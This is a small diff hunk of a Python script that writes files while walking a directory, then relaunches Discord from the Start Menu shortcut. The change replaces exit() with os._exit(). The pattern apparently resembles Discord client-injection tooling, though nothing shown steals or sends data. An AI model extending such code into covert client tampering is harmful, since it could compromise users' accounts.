@@ -11,6 +11,6 @@ for a,b,c in os.walk(env):
                 f.close()
             try:
                 os.startfile(os.getenv('appdata')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk')
-                exit()
+                os._exit()
             except:
-                exit()
+                os._exit()
